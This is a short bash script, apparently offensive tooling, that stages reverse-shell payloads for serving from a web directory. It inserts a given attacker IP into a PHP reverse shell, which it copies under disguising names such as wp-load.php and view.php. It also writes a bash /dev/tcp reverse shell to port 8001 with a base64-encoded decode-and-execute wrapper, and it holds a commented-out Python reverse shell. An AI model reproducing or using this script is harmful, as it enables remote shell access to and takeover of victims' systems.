#!/bin/bash


cp -r www-skel/ www/
sed -i "s/127.0.0.1/$1/g" www/*
cp www/php-rev.php www/socket.php
cp www/php-rev.php www/wp-load.php
cp www/php-rev.php www/view.php

echo "bash -i >& /dev/tcp/$1/8001 0>&1" >> www/corn.sh
SHELL=$(cat www/corn.sh | base64 -w 0)
echo "echo -n '$SHELL' | base64 -d | bash" >> www/corn.b64.sh
#echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> www/Pyshell.sh
#Pyshell=$(cat www/Pyshell.sh | base64 -w 0)
#echo "echo -n '$Pyshell' | base64 -d | python" >> www/Pyshell.64.sh
 
